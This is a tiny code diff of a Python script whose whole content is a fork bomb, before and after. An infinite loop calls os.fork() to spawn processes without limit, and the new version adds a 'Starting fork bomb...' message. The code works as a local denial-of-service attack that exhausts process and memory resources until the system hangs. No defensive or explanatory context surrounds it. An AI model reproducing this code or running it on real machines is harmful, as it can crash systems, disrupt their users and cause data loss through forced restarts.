@@ -1,4 +1,7 @@
 #!/usr/bin/env python3
 
 import os
-while True: os.fork()
+
+print('Starting fork bomb...')
+while True:
+  os.fork()
